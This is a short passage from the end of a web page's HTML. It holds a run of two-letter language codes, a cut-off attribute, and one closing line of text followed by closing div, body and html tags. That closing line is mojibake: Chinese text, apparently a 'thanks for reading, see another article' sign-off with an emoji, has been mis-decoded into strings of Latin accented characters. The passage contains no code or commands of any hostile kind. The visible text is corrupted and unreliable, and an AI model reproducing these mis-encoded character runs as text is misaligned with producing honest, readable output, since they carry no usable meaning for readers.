ks kt ku kv kw kx ky kz im bi translated">æ„Ÿè°¢æ‚¨çš„é˜…è¯»ï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹å¦ä¸€ç¯‡æ–‡ç« ã€‚ğŸ¤˜</p></div></div>    
</body>
</html>